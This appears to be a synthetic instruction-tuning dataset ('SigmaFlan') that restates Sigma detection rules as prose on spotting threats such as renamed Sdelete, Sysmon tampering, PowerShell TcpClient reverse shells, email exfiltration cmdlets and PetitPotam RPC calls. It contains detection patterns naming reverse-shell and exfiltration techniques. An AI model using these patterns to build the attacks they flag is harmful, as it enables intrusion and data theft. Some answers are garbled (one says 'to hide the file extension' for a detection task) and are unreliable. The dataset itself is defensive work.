    "instruction": "How can I detect: use of a renamed SysInternals Sdelete, which is something an administrator shouldn't do (the renaming)",
    "context": "",
    "output": "In order to detect the use of a renamed SysInternals Sdelete, which is something an administrator shouldn't do (the renaming), you should: monitor for the creation of processes on Windows systems where the original file name is 'sdelete.exe'. However, it's important to note that detections should exclude any cases where the image path ends with '\\sdelete.exe' or '\\sdelete64.exe' to avoid flagging legitimate usage of these tools. Key information to be logged includes the Computer Name, User, Command Line, and Parent Command Line. Be aware that legitimate system administrator activities might sometimes involve using such tools, which could be considered a false positive in the context of this detection. This process aims to recognize unauthorized modifications or potential misuse of Sdelete, a tool known for securely deleting files, indicating a high level of concern if detected under these conditions.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "use of a renamed SysInternals Sdelete, which is something an administrator shouldn't do (the renaming)",
      "answer": "In order to detect the use of a renamed SysInternals Sdelete, which is something an administrator shouldn't do (the renaming), you should: monitor for the creation of processes on Windows systems where the original file name is 'sdelete.exe'. However, it's important to note that detections should exclude any cases where the image path ends with '\\sdelete.exe' or '\\sdelete64.exe' to avoid flagging legitimate usage of these tools. Key information to be logged includes the Computer Name, User, Command Line, and Parent Command Line. Be aware that legitimate system administrator activities might sometimes involve using such tools, which could be considered a false positive in the context of this detection. This process aims to recognize unauthorized modifications or potential misuse of Sdelete, a tool known for securely deleting files, indicating a high level of concern if detected under these conditions."
    }
  },
  {
    "instruction": "Explain how should I detect the following: addition of a rule to the Windows Firewall exception list where the application resides in a suspicious folder",
    "context": "",
    "output": "In order to detect the addition of a rule to the Windows Firewall exception list where the application resides in a suspicious folder, you should: \n\nMonitor the Windows firewall activity, particularly on Windows 10 and 11 platforms. Keep an eye out for event IDs 2004 and 2071, which indicate that a new rule has been added to the Windows Defender Firewall exception list. Specifically, focus on applications added to the exception list that are located within the '\\AppData\\' or '\\Temp\\' directories. These locations are often used by malicious software because they are user-accessible and frequently overlooked by users and some security programs.\n\nIt's important to exclude from alerts any changes that involve a predefined list of applications that might normally operate from those directories for benign reasons. These include well-known applications such as Microsoft Teams, Keybase, Messenger, and Opera Browser if they are exactly located in their usual application paths like '\\AppData\\local\\microsoft\\teams\\current\\teams.exe' for Teams, '\\AppData\\Local\\Keybase\\keybase.exe' for Keybase, etc.\n\nYou need to be cautious and consider any legitimate application that runs from the AppData user directory as a potential false positive. Such applications may also add firewall exceptions as part of their normal operations. Therefore, while maintaining a high level of alertness for suspicious activity associated with these event IDs and paths, careful investigation of each incident is advised to distinguish between legitimate and malicious activities.\n\nThis monitoring approach targets tactics associated with Persistence and Privilege Escalation, where attackers attempt to maintain their presence on a system and potentially elevate their control by making their malicious software harder to block by adding it to the firewall's exception list.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "addition of a rule to the Windows Firewall exception list where the application resides in a suspicious folder",
      "answer": "In order to detect the addition of a rule to the Windows Firewall exception list where the application resides in a suspicious folder, you should: \n\nMonitor the Windows firewall activity, particularly on Windows 10 and 11 platforms. Keep an eye out for event IDs 2004 and 2071, which indicate that a new rule has been added to the Windows Defender Firewall exception list. Specifically, focus on applications added to the exception list that are located within the '\\AppData\\' or '\\Temp\\' directories. These locations are often used by malicious software because they are user-accessible and frequently overlooked by users and some security programs.\n\nIt's important to exclude from alerts any changes that involve a predefined list of applications that might normally operate from those directories for benign reasons. These include well-known applications such as Microsoft Teams, Keybase, Messenger, and Opera Browser if they are exactly located in their usual application paths like '\\AppData\\local\\microsoft\\teams\\current\\teams.exe' for Teams, '\\AppData\\Local\\Keybase\\keybase.exe' for Keybase, etc.\n\nYou need to be cautious and consider any legitimate application that runs from the AppData user directory as a potential false positive. Such applications may also add firewall exceptions as part of their normal operations. Therefore, while maintaining a high level of alertness for suspicious activity associated with these event IDs and paths, careful investigation of each incident is advised to distinguish between legitimate and malicious activities.\n\nThis monitoring approach targets tactics associated with Persistence and Privilege Escalation, where attackers attempt to maintain their presence on a system and potentially elevate their control by making their malicious software harder to block by adding it to the firewall's exception list."
    }
  },
  {
    "instruction": "Explain how should I detect the following: updates to Sysmon's configuration. Attackers might update or replace the Sysmon configuration with a bare bone one to avoid monitoring without shutting down the service completely",
    "context": "",
    "output": "In order to detect updates to Sysmon's configuration, which attackers might use to sneakily avoid monitoring by updating or replacing Sysmon's configuration with a minimal one without entirely shutting down the service, you should monitor Windows process creation logs for specific activities. Look out for processes named \"Sysmon64.exe\" or \"Sysmon.exe\" that are being initiated, especially those described as a \"System activity monitor\". Pay close attention to command lines that contain '-c' or '/c', as these are commonly used to change Sysmon's configuration. Be aware that legitimate administrators may also use these commands to update Sysmon's configuration, so not all detections will indicate a malicious activity. However, given the context of an unusual or unscheduled Sysmon configuration change, it's worth investigating such events with a medium level of concern, keeping in mind potential false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "updates to Sysmon's configuration. Attackers might update or replace the Sysmon configuration with a bare bone one to avoid monitoring without shutting down the service completely",
      "answer": "In order to detect updates to Sysmon's configuration, which attackers might use to sneakily avoid monitoring by updating or replacing Sysmon's configuration with a minimal one without entirely shutting down the service, you should monitor Windows process creation logs for specific activities. Look out for processes named \"Sysmon64.exe\" or \"Sysmon.exe\" that are being initiated, especially those described as a \"System activity monitor\". Pay close attention to command lines that contain '-c' or '/c', as these are commonly used to change Sysmon's configuration. Be aware that legitimate administrators may also use these commands to update Sysmon's configuration, so not all detections will indicate a malicious activity. However, given the context of an unusual or unscheduled Sysmon configuration change, it's worth investigating such events with a medium level of concern, keeping in mind potential false positives."
    }
  },
  {
    "instruction": "Explain how should I detect the following: Hides the file extension through modification of the registry",
    "context": "",
    "output": "In order to hide the file extension through modification of the registry, you should: Monitor Windows registry set actions focusing on detecting any changes made to specific registry keys that control how file extensions are displayed and whether hidden files are shown in the Windows environment. Specifically, pay attention to any event where the \"SetValue\" event type is observed that modifies the \"\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt\" registry key to a value of 'DWORD (0x00000001)', which effectively hides file extensions from being shown to the user. Similarly, look out for modifications to the \"\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden\" registry key, particularly changes made to set its value to 'DWORD (0x00000002)', which configures the system to not display hidden files. Implement detection mechanisms that can identify either one of these modifications as they could indicate malicious activity aimed at concealing potentially harmful file extensions or hiding malicious files in plain sight. It is also important to consider that there may be legitimate cases where administrative scripts perform such actions for valid reasons. Thus, it's essential to verify the context of these modifications to avoid false positives. The urgency for such monitoring and analysis is considered of medium level, reflecting the potential risk posed by successfully hiding malicious files or enabling deceptive file names through hidden extensions. Tactically, this activity is linked to persistence, defense evasion, and potentially the initial access phase of a cyber attack.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Hides the file extension through modification of the registry",
      "answer": "In order to hide the file extension through modification of the registry, you should: Monitor Windows registry set actions focusing on detecting any changes made to specific registry keys that control how file extensions are displayed and whether hidden files are shown in the Windows environment. Specifically, pay attention to any event where the \"SetValue\" event type is observed that modifies the \"\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt\" registry key to a value of 'DWORD (0x00000001)', which effectively hides file extensions from being shown to the user. Similarly, look out for modifications to the \"\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden\" registry key, particularly changes made to set its value to 'DWORD (0x00000002)', which configures the system to not display hidden files. Implement detection mechanisms that can identify either one of these modifications as they could indicate malicious activity aimed at concealing potentially harmful file extensions or hiding malicious files in plain sight. It is also important to consider that there may be legitimate cases where administrative scripts perform such actions for valid reasons. Thus, it's essential to verify the context of these modifications to avoid false positives. The urgency for such monitoring and analysis is considered of medium level, reflecting the potential risk posed by successfully hiding malicious files or enabling deceptive file names through hidden extensions. Tactically, this activity is linked to persistence, defense evasion, and potentially the initial access phase of a cyber attack."
    }
  },
  {
    "instruction": "Can you explain how to detect: email exfiltration via powershell cmdlets",
    "context": "",
    "output": "Certainly!\n\nIn order to detect email exfiltration via PowerShell cmdlets, you should focus on monitoring process creation logs within Windows environments. Specifically, keep a vigilant eye for any instances where 'powershell.exe' or 'pwsh.exe' are launched. Within the command lines initiated by these executables, it is imperative to look for the combination of certain PowerShell commands. These include 'Add-PSSnapin', paired with 'Get-Recipient', and the additional use of '-ExpandProperty EmailAddresses', 'SmtpAddress', and '-hidetableheaders'. The presence of these command-line arguments together may indicate an attempt to query and exfiltrate email addresses without triggering obvious signs of malicious activity. Given the high impact of such an action, the alert level for this behavior is considered high, although it's important to remain cautious of potential unknown false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "email exfiltration via powershell cmdlets",
      "answer": "In order to detect email exfiltration via PowerShell cmdlets, you should focus on monitoring process creation logs within Windows environments. Specifically, keep a vigilant eye for any instances where 'powershell.exe' or 'pwsh.exe' are launched. Within the command lines initiated by these executables, it is imperative to look for the combination of certain PowerShell commands. These include 'Add-PSSnapin', paired with 'Get-Recipient', and the additional use of '-ExpandProperty EmailAddresses', 'SmtpAddress', and '-hidetableheaders'. The presence of these command-line arguments together may indicate an attempt to query and exfiltrate email addresses without triggering obvious signs of malicious activity. Given the high impact of such an action, the alert level for this behavior is considered high, although it's important to remain cautious of potential unknown false positives."
    }
  },
  {
    "instruction": "How to detect: Identifies when an ElastiCache security group has been modified or deleted.",
    "context": "",
    "output": "In order to identify when an ElastiCache security group has been modified or deleted, you should monitor CloudTrail logs for AWS services for specific activities. Look for events sourced from elasticache.amazonaws.com that indicate modifications to Elasticache security groups. These events include 'DeleteCacheSecurityGroup', which signifies the deletion of a security group; 'AuthorizeCacheSecurityGroupIngress' and 'RevokeCacheSecurityGroupIngress', which pertain to the authorization or revocation of ingress rules; and 'AuthorizeCacheSecurityGroupEgress' and 'RevokeCacheSecurityGroupEgress', relevant to the authorization or revocation of egress rules. It is important to note that not all modifications may be unauthorized or malicious. Sometimes, system or network administrators may perform legitimate modifications. Therefore, it is advisable to verify the identity of the user making the changes, as well as the user agent and/or hostname, to ensure they are recognized entities within your environment. Modifications from unfamiliar users or hosts should be subjected to further investigation. Known behaviors that repeatedly trigger false positives can be exempted from monitoring to refine the detection process. This practice maintains a focus on identifying potentially malicious activities surrounding ElastiCache security groups while minimizing noise from legitimate administrative actions.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Identifies when an ElastiCache security group has been modified or deleted.",
      "answer": "In order to identify when an ElastiCache security group has been modified or deleted, you should monitor CloudTrail logs for AWS services for specific activities. Look for events sourced from elasticache.amazonaws.com that indicate modifications to Elasticache security groups. These events include 'DeleteCacheSecurityGroup', which signifies the deletion of a security group; 'AuthorizeCacheSecurityGroupIngress' and 'RevokeCacheSecurityGroupIngress', which pertain to the authorization or revocation of ingress rules; and 'AuthorizeCacheSecurityGroupEgress' and 'RevokeCacheSecurityGroupEgress', relevant to the authorization or revocation of egress rules. It is important to note that not all modifications may be unauthorized or malicious. Sometimes, system or network administrators may perform legitimate modifications. Therefore, it is advisable to verify the identity of the user making the changes, as well as the user agent and/or hostname, to ensure they are recognized entities within your environment. Modifications from unfamiliar users or hosts should be subjected to further investigation. Known behaviors that repeatedly trigger false positives can be exempted from monitoring to refine the detection process. This practice maintains a focus on identifying potentially malicious activities surrounding ElastiCache security groups while minimizing noise from legitimate administrative actions."
    }
  },
  {
    "instruction": "How can I detect: suspicious files created via the OneNote application. This could indicate a potential malicious \".one\"/\".onepkg\" file was executed as seen being used in malware activity in the wild",
    "context": "",
    "output": "In order to detect suspicious files created via the OneNote application, which could indicate a potential malicious \".one\"/\".onepkg\" file was executed as seen being used in malware activity in the wild, you should: Monitor file events on Windows systems, particularly focusing on the execution of OneNote application executables (onenote.exe, onenotem.exe, onenoteim.exe). Pay close attention to files created in the '\\AppData\\Local\\Temp\\OneNote\\' directory, especially those with extensions such as '.bat', '.chm', '.cmd', '.dll', '.exe', '.hta', '.htm', '.html', '.js', '.lnk', '.ps1', '.vbe', '.vbs', and '.wsf'. These file types are known to be leveraged in attacks and their creation in the context of OneNote activity is highly suspicious. The rule is designed with a high confidence level, implying that false positives should be minimal unless OneNote is regularly used for embedding and sharing different document types, in which case, occasional false positives may occur.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious files created via the OneNote application. This could indicate a potential malicious \".one\"/\".onepkg\" file was executed as seen being used in malware activity in the wild",
      "answer": "In order to detect suspicious files created via the OneNote application, which could indicate a potential malicious \".one\"/\".onepkg\" file was executed as seen being used in malware activity in the wild, you should: Monitor file events on Windows systems, particularly focusing on the execution of OneNote application executables (onenote.exe, onenotem.exe, onenoteim.exe). Pay close attention to files created in the '\\AppData\\Local\\Temp\\OneNote\\' directory, especially those with extensions such as '.bat', '.chm', '.cmd', '.dll', '.exe', '.hta', '.htm', '.html', '.js', '.lnk', '.ps1', '.vbe', '.vbs', and '.wsf'. These file types are known to be leveraged in attacks and their creation in the context of OneNote activity is highly suspicious. The rule is designed with a high confidence level, implying that false positives should be minimal unless OneNote is regularly used for embedding and sharing different document types, in which case, occasional false positives may occur."
    }
  },
  {
    "instruction": "Can you explain how to detect: Pandemic Windows Implant",
    "context": "",
    "output": "Certainly!\n\nIn order to detect Pandemic Windows Implant, you should: Monitor registry events on Windows operating systems for any activities that involve the specific registry path '\\SYSTEM\\CurrentControlSet\\services\\null\\Instance'. This approach relies on recognizing attempts to interact with a registry key often associated with the Pandemic implant, which might indicate the presence of this malicious software on the system. The detection process includes gathering additional context such as the EventID, CommandLine, ParentCommandLine, Image, User, and the TargetObject involved in the operation. While it's critical to watch for such activities, be aware that not all modifications or interactions with this registry key are malicious, though they are considered highly suspicious hence classified at a critical level.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Pandemic Windows Implant",
      "answer": "In order to detect Pandemic Windows Implant, you should: Monitor registry events on Windows operating systems for any activities that involve the specific registry path '\\SYSTEM\\CurrentControlSet\\services\\null\\Instance'. This approach relies on recognizing attempts to interact with a registry key often associated with the Pandemic implant, which might indicate the presence of this malicious software on the system. The detection process includes gathering additional context such as the EventID, CommandLine, ParentCommandLine, Image, User, and the TargetObject involved in the operation. While it's critical to watch for such activities, be aware that not all modifications or interactions with this registry key are malicious, though they are considered highly suspicious hence classified at a critical level."
    }
  },
  {
    "instruction": "Please help me detect the following: image load events with revoked certificates by code integrity.",
    "context": "",
    "output": "Sure!\nIn order to detect image load events with revoked certificates by code integrity, you should monitor for specific events within the Windows Code Integrity operational logs. Look for occurrences when a revoked image is loaded into the system, identified by Event IDs 3032 and 3035. Event ID 3032 indicates that Code Integrity determined a revoked image is being loaded into the system, and it's recommended to check with the publisher if a new signed version of the image is available. Meanwhile, Event ID 3035 means that a revoked image is loaded but allowed because a kernel mode debugger is attached. These detections are critical as they help in identifying potential malicious or compromised software being executed on the system which could be a part of various attack techniques. The likelihood of these events being false positives is low, indicating a high level of confidence in these alerts when they trigger. Monitoring for these events can aid in defending against tactics such as Persistence, Privilege Escalation, and Defense Evasion where attackers might leverage revoked or untrusted certificates to execute malicious payloads.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "image load events with revoked certificates by code integrity.",
      "answer": "In order to detect image load events with revoked certificates by code integrity, you should monitor for specific events within the Windows Code Integrity operational logs. Look for occurrences when a revoked image is loaded into the system, identified by Event IDs 3032 and 3035. Event ID 3032 indicates that Code Integrity determined a revoked image is being loaded into the system, and it's recommended to check with the publisher if a new signed version of the image is available. Meanwhile, Event ID 3035 means that a revoked image is loaded but allowed because a kernel mode debugger is attached. These detections are critical as they help in identifying potential malicious or compromised software being executed on the system which could be a part of various attack techniques. The likelihood of these events being false positives is low, indicating a high level of confidence in these alerts when they trigger. Monitoring for these events can aid in defending against tactics such as Persistence, Privilege Escalation, and Defense Evasion where attackers might leverage revoked or untrusted certificates to execute malicious payloads."
    }
  },
  {
    "instruction": "Can you explain how to detect: usage of the \"TcpClient\" class. Which can be abused to establish remote connections and reverse-shells. As seen used by the Nishang \"Invoke-PowerShellTcpOneLine\" reverse shell and other.",
    "context": "",
    "output": "Certainly!\n\nIn order to detect usage of the \"TcpClient\" class, which can be abused to establish remote connections and reverse-shells, as seen used by the Nishang \"Invoke-PowerShellTcpOneLine\" reverse shell and others, you should: Focus on monitoring process creation logs in Windows systems. Look specifically for processes spawned with the original file names 'PowerShell.EXE' or 'pwsh.dll', as well as those processes where the executable image path ends with '\\powershell.exe' or '\\pwsh.exe'. Additionally, check the command line arguments of these processes for the presence of 'Net.Sockets.TCPClient', '.GetStream(', and '.Write(' together, as this combination indicates the potential use of the TcpClient class to initiate networking connections, which is a common technique in establishing reverse shell connections. Be mindful that there can be rare legitimate administrative uses of this functionality, such as checking network connectivity, which are considered false positives. The severity level for this behavior is rated high due to the potential misuse in malicious activities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of the \"TcpClient\" class. Which can be abused to establish remote connections and reverse-shells. As seen used by the Nishang \"Invoke-PowerShellTcpOneLine\" reverse shell and other.",
      "answer": "In order to detect usage of the \"TcpClient\" class, which can be abused to establish remote connections and reverse-shells, as seen used by the Nishang \"Invoke-PowerShellTcpOneLine\" reverse shell and others, you should: Focus on monitoring process creation logs in Windows systems. Look specifically for processes spawned with the original file names 'PowerShell.EXE' or 'pwsh.dll', as well as those processes where the executable image path ends with '\\powershell.exe' or '\\pwsh.exe'. Additionally, check the command line arguments of these processes for the presence of 'Net.Sockets.TCPClient', '.GetStream(', and '.Write(' together, as this combination indicates the potential use of the TcpClient class to initiate networking connections, which is a common technique in establishing reverse shell connections. Be mindful that there can be rare legitimate administrative uses of this functionality, such as checking network connectivity, which are considered false positives. The severity level for this behavior is rated high due to the potential misuse in malicious activities."
    }
  },
  {
    "instruction": "Explain how should I detect the following: Device code flow is an OAuth 2.0 protocol flow specifically for input constrained devices and is not used in all environments.\nIf this type of flow is seen in the environment and not being used in an input constrained device scenario, further investigation is warranted.\nThis can be a misconfigured application or potentially something malicious.\n",
    "context": "",
    "output": "In order to identify when Device code flow, an OAuth 2.0 protocol flow specifically tailored for input constrained devices, is being used in environments where it should not be (indicating it might be a misconfigured application or potentially something malicious), you should: Focus on Azure sign-in logs for detections. Look for log entries where the message includes the term \"Device Code\". Since this method is uncommon outside of input constrained device scenarios, any detection of this flow in a non-targeted environment should trigger further investigation. Be aware that there are legitimate cases where applications that are input constrained will require using the device code flow for valid authentications; these should not be automatically considered as false positives. The importance of monitoring for this activity is rated at a medium level.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Device code flow is an OAuth 2.0 protocol flow specifically for input constrained devices and is not used in all environments.\nIf this type of flow is seen in the environment and not being used in an input constrained device scenario, further investigation is warranted.\nThis can be a misconfigured application or potentially something malicious.\n",
      "answer": "In order to identify when Device code flow, an OAuth 2.0 protocol flow specifically tailored for input constrained devices, is being used in environments where it should not be (indicating it might be a misconfigured application or potentially something malicious), you should: Focus on Azure sign-in logs for detections. Look for log entries where the message includes the term \"Device Code\". Since this method is uncommon outside of input constrained device scenarios, any detection of this flow in a non-targeted environment should trigger further investigation. Be aware that there are legitimate cases where applications that are input constrained will require using the device code flow for valid authentications; these should not be automatically considered as false positives. The importance of monitoring for this activity is rated at a medium level."
    }
  },
  {
    "instruction": "How can I detect: Crassus, a Windows privilege escalation discovery tool, based on PE metadata characteristics.",
    "context": "",
    "output": "In order to detect Crassus, a Windows privilege escalation discovery tool, based on PE metadata characteristics, you should: Monitor for process creation events on Windows systems that exhibit any of the following characteristics indicative of the Crassus privilege escalation tool: An executable file ending with '\\Crassus.exe', the original filename being 'Crassus.exe', or the process description containing the term 'Crassus'. It is unlikely that there will be legitimate processes that meet these conditions, hence any detection of such activity should be considered with high suspicion and investigated promptly. This detection methodology is focused on identifying potential misuse of system vulnerabilities for escalating privileges using the specified tool, by scrutinizing the metadata of process executables and their descriptions.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Crassus, a Windows privilege escalation discovery tool, based on PE metadata characteristics.",
      "answer": "In order to detect Crassus, a Windows privilege escalation discovery tool, based on PE metadata characteristics, you should: Monitor for process creation events on Windows systems that exhibit any of the following characteristics indicative of the Crassus privilege escalation tool: An executable file ending with '\\Crassus.exe', the original filename being 'Crassus.exe', or the process description containing the term 'Crassus'. It is unlikely that there will be legitimate processes that meet these conditions, hence any detection of such activity should be considered with high suspicion and investigated promptly. This detection methodology is focused on identifying potential misuse of system vulnerabilities for escalating privileges using the specified tool, by scrutinizing the metadata of process executables and their descriptions."
    }
  },
  {
    "instruction": "Can you explain how to detect: service account is disabled or deleted in Google Cloud.",
    "context": "",
    "output": "Certainly!\n\nIn order to identify when a service account is disabled or deleted in Google Cloud, you should monitor Google Cloud Platform (GCP) audit logs for activities where a method name ends with \u2018.serviceAccounts.disable\u2019 or \u2018.serviceAccounts.delete\u2019. These activities can indicate that a service account, which could be crucial for your cloud infrastructure and applications, is being tampered with either maliciously or inadvertently. Given that service accounts in GCP are used for programmatic access between services or by applications hosted on GCP, any unauthorized or unexpected disabling or deletion of these accounts can lead to service disruptions or potential security breaches.\n\nDuring your analysis, consider that disabling or deleting service accounts might sometimes be a legitimate action, performed by system administrators as part of routine maintenance or configuration changes. Therefore, it\u2019s important to verify the user identity, user agent, and/or hostname associated with these actions to ascertain whether they align with known, safe behaviors within your environment. Any activity conducted by unfamiliar users or from unexpected sources should be scrutinized and potentially investigated further to rule out malicious intent.\n\nTo mitigate false positives and ensure only relevant security events are highlighted, it's advisable to refine detection mechanisms by exempting known benign behaviors from triggering alerts. This approach helps in maintaining the focus on genuinely suspicious activities that might compromise the security or functionality of your cloud environment.\n\nThis monitoring and analysis strategy falls under medium priority due to the balance between potential security impacts and the need to accommodate legitimate administrative activities without overwhelming security teams with false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "service account is disabled or deleted in Google Cloud.",
      "answer": "In order to identify when a service account is disabled or deleted in Google Cloud, you should monitor Google Cloud Platform (GCP) audit logs for activities where a method name ends with \u2018.serviceAccounts.disable\u2019 or \u2018.serviceAccounts.delete\u2019. These activities can indicate that a service account, which could be crucial for your cloud infrastructure and applications, is being tampered with either maliciously or inadvertently. Given that service accounts in GCP are used for programmatic access between services or by applications hosted on GCP, any unauthorized or unexpected disabling or deletion of these accounts can lead to service disruptions or potential security breaches.\n\nDuring your analysis, consider that disabling or deleting service accounts might sometimes be a legitimate action, performed by system administrators as part of routine maintenance or configuration changes. Therefore, it\u2019s important to verify the user identity, user agent, and/or hostname associated with these actions to ascertain whether they align with known, safe behaviors within your environment. Any activity conducted by unfamiliar users or from unexpected sources should be scrutinized and potentially investigated further to rule out malicious intent.\n\nTo mitigate false positives and ensure only relevant security events are highlighted, it's advisable to refine detection mechanisms by exempting known benign behaviors from triggering alerts. This approach helps in maintaining the focus on genuinely suspicious activities that might compromise the security or functionality of your cloud environment.\n\nThis monitoring and analysis strategy falls under medium priority due to the balance between potential security impacts and the need to accommodate legitimate administrative activities without overwhelming security teams with false positives."
    }
  },
  {
    "instruction": "Can you explain how to detect: usage of the windows RPC library Encrypting File System Remote Protocol (MS-EFSRPC). Variations of this RPC are used within the attack refereed to as PetitPotam.\nThe usage of this RPC function should be rare if ever used at all.\nThus usage of this function is uncommon enough that any usage of this RPC function should warrant further investigation to determine if it is legitimate.\n View surrounding logs (within a few minutes before and after) from the Source IP to. Logs from from the Source IP would include dce_rpc, smb_mapping, smb_files, rdp, ntlm, kerberos, etc..'\n",
    "context": "",
    "output": "Certainly!\n\nIn order to Detects usage of the windows RPC library Encrypting File System Remote Protocol (MS-EFSRPC). Variations of this RPC are used within the attack refereed to as PetitPotam. The usage of this RPC function should be rare if ever used at all. Thus usage of this function is uncommon enough that any usage of this RPC function should warrant further investigation to determine if it is legitimate. View surrounding logs (within a few minutes before and after) from the Source IP to. Logs from from the Source IP would include dce_rpc, smb_mapping, smb_files, rdp, ntlm, kerberos, etc..', you should: Monitor the network for any activity related to the Windows Encrypting File System Remote Protocol (MS-EFSRPC) that begins with operation names starting with 'efs'. This is executed by scrutinizing the traffic logs gathered from Zeek's DCE_RPC service. It is critical to focus on the following fields during the analysis: the original host identifier (id.orig_h), the responding host identifier (id.resp_h), the responding port (id.resp_p), the operation undertaken, the specific endpoint accessed, the named pipe involved, and the unique identifier (uid) for each operation. Attention should be paid to ensure that activities are verified to discern between uncommon but legitimate Windows administrator tasks or software processes that employ Encrypting File System RPC Calls, and potential malicious endeavors. Given the atypical nature of this function's usage, any appearances should prompt a deeper investigation. This involves analyzing the accompanying logs surrounding the source IP within a few minutes before and after the detected event, looking for related activities involving dce_rpc, smb_mapping, smb_files, rdp, ntlm, kerberos, and more.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of the windows RPC library Encrypting File System Remote Protocol (MS-EFSRPC). Variations of this RPC are used within the attack refereed to as PetitPotam.\nThe usage of this RPC function should be rare if ever used at all.\nThus usage of this function is uncommon enough that any usage of this RPC function should warrant further investigation to determine if it is legitimate.\n View surrounding logs (within a few minutes before and after) from the Source IP to. Logs from from the Source IP would include dce_rpc, smb_mapping, smb_files, rdp, ntlm, kerberos, etc..'\n",
      "answer": "In order to Detects usage of the windows RPC library Encrypting File System Remote Protocol (MS-EFSRPC). Variations of this RPC are used within the attack refereed to as PetitPotam. The usage of this RPC function should be rare if ever used at all. Thus usage of this function is uncommon enough that any usage of this RPC function should warrant further investigation to determine if it is legitimate. View surrounding logs (within a few minutes before and after) from the Source IP to. Logs from from the Source IP would include dce_rpc, smb_mapping, smb_files, rdp, ntlm, kerberos, etc..', you should: Monitor the network for any activity related to the Windows Encrypting File System Remote Protocol (MS-EFSRPC) that begins with operation names starting with 'efs'. This is executed by scrutinizing the traffic logs gathered from Zeek's DCE_RPC service. It is critical to focus on the following fields during the analysis: the original host identifier (id.orig_h), the responding host identifier (id.resp_h), the responding port (id.resp_p), the operation undertaken, the specific endpoint accessed, the named pipe involved, and the unique identifier (uid) for each operation. Attention should be paid to ensure that activities are verified to discern between uncommon but legitimate Windows administrator tasks or software processes that employ Encrypting File System RPC Calls, and potential malicious endeavors. Given the atypical nature of this function's usage, any appearances should prompt a deeper investigation. This involves analyzing the accompanying logs surrounding the source IP within a few minutes before and after the detected event, looking for related activities involving dce_rpc, smb_mapping, smb_files, rdp, ntlm, kerberos, and more."
    }
  },
  {
    "instruction": "How to detect: execution of \"odbcconf\" with \"REGSVR\" in order to register a new DLL (equivalent to running regsvr32). Attackers abuse this to install and run malicious DLLs.",
    "context": "",
    "output": "In order to detect execution of \"odbcconf\" with \"REGSVR\" in order to register a new DLL (equivalent to running regsvr32), which attackers abuse to install and run malicious DLLs, you should: focus on monitoring process creation events within Windows environments. Specifically, watch for occurrences of the process \"odbcconf.exe\" either by its image name or original file name. Additionally, scrutinize instances where the command line includes both \"REGSVR\" and references to \".dll\" files. This combination of conditions typically signals an attempt to register a new DLL maliciously. Be aware that legitimate usage of \"odbcconf\" to register DLLs may also trigger this detection, so it's essential to investigate the context, such as the DLL's path and content, to accurately assess the nature of the activity. This approach involves a medium level of alertness due to the possibility of false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of \"odbcconf\" with \"REGSVR\" in order to register a new DLL (equivalent to running regsvr32). Attackers abuse this to install and run malicious DLLs.",
      "answer": "In order to detect execution of \"odbcconf\" with \"REGSVR\" in order to register a new DLL (equivalent to running regsvr32), which attackers abuse to install and run malicious DLLs, you should: focus on monitoring process creation events within Windows environments. Specifically, watch for occurrences of the process \"odbcconf.exe\" either by its image name or original file name. Additionally, scrutinize instances where the command line includes both \"REGSVR\" and references to \".dll\" files. This combination of conditions typically signals an attempt to register a new DLL maliciously. Be aware that legitimate usage of \"odbcconf\" to register DLLs may also trigger this detection, so it's essential to investigate the context, such as the DLL's path and content, to accurately assess the nature of the activity. This approach involves a medium level of alertness due to the possibility of false positives."
    }
  },
  {
    "instruction": "Please help me detect the following: download of suspicious file type from a well-known file and paste sharing domain",
    "context": "",
    "output": "Sure!\nIn order to detect the download of suspicious file type from a well-known file and paste sharing domain, you should monitor Windows event logs for file creation events that have hashes generated for their streams (`create_stream_hash` category). Specifically, focus on the contents of these files for specific domains known to host and share files, which include 'transfer.sh', 'raw.githubusercontent.com', 'gist.githubusercontent.com', 'pastebin.com', 'cdn.discordapp.com/attachments/', 'mediafire.com', 'mega.nz', 'ddns.net', '.paste.ee', '.hastebin.com', '.ghostbin.co/', 'ufile.io', 'storage.googleapis.com', 'anonfiles.com', 'send.exploit.in', 'privatlab.net', 'privatlab.com', 'sendspace.com', 'pastetext.net', 'pastebin.pl', and 'paste.ee'. Additionally, check if the file extensions of the created files are modified with ':Zone' identifier which is indicative of attempts to bypass security measures, specifically looking for '.ps1:Zone', '.bat:Zone', and '.cmd:Zone'. The attention to both the content sources and the unusual modification in file extensions helps in identifying potentially malicious downloads from known file sharing services and domains often used for distributing malware or tools for cyberattacks. Log fields such as 'TargetFilename' and 'Image' are crucial for this detection, helping to specify and locate the files of interest. Despite the robustness of this approach, there may be unknown scenarios leading to false positives, emphasizing the importance of context and further investigation upon detection. The associated risk level for these detections is deemed medium, reflecting the need for awareness 